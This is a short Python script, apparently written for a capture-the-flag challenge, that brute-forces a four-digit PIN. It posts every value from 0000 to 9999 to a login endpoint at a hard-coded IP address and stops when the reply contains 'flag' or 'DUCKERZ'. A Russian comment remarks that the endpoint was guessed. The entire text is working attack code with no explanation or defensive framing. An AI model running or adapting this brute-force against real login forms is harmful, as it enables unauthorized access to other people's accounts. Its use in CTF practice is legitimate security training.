import requests

url = "http://94.19.79.169:20002/login"  # если угадали эндпоинт
for pin in range(10000):
    pin_str = f"{pin:04d}"
    data = {"pin": pin_str}
    r = requests.post(url, data=data)
    if "flag" in r.text or "DUCKERZ" in r.text:
        print(f"Found PIN: {pin_str}")
        print(r.text[:200])
        break
    if pin % 100 == 0:
        print(pin)